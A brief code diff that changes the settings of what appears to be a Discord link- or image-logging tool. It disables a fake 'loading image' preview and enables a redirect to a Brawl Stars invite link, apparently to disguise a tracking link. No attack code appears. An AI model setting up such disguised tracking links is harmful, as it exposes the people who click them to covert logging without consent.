@@ -26,14 +26,14 @@ config = {
     "vpnCheck": 1,
 
     "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1,
 
  
     "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here" 
+        "redirect": True,
+        "page": "https://link.brawlstars.com/invite/gameroom/en?tag=X4KY7P8" 
     },
 
   
